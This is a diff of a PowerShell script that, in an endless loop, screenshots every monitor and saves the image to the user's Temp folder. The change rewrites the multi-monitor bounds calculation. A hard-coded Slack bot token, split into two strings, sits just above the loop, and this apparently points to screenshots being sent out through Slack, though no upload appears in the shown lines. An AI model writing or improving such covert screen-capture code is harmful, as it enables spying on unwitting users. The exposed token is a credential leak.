@@ -5,25 +5,29 @@ $sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"
 while(1){
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-  $screens = [Windows.Forms.Screen]::AllScreens
+  $screens = [System.Windows.Forms.Screen]::AllScreens
 
-  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+  $left = [int]::MaxValue
+  $top = [int]::MaxValue
+  $right = [int]::MinValue
+  $bottom = [int]::MinValue
 
-  $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-  
-  $bmp = New-Object System.Drawing.Bitmap ($bounds.Width, $bounds.Height)
-  $graphics = [Drawing.Graphics]::FromImage($bmp)
+  foreach ($screen in $screens) {
+      $left = [Math]::Min($left, $screen.Bounds.Left)
+      $top = [Math]::Min($top, $screen.Bounds.Top)
+      $right = [Math]::Max($right, $screen.Bounds.Right)
+      $bottom = [Math]::Max($bottom, $screen.Bounds.Bottom)
+  }
 
-  $dpiX = $graphics.DpiX / 96.0
-  $dpiY = $graphics.DpiY / 96.0
+  $width = $right - $left
+  $height = $bottom - $top
 
-  $scaledBounds = New-Object Drawing.Rectangle (0, 0, [int]($bounds.Width * $dpiX), [int]($bounds.Height * $dpiY))
-  
-  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $scaledBounds.Size)
-  
+  $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+  $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $width, $height
+  $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+
+  $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+
   $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\crab.png")
   $graphics.Dispose()
   $bmp.Dispose()
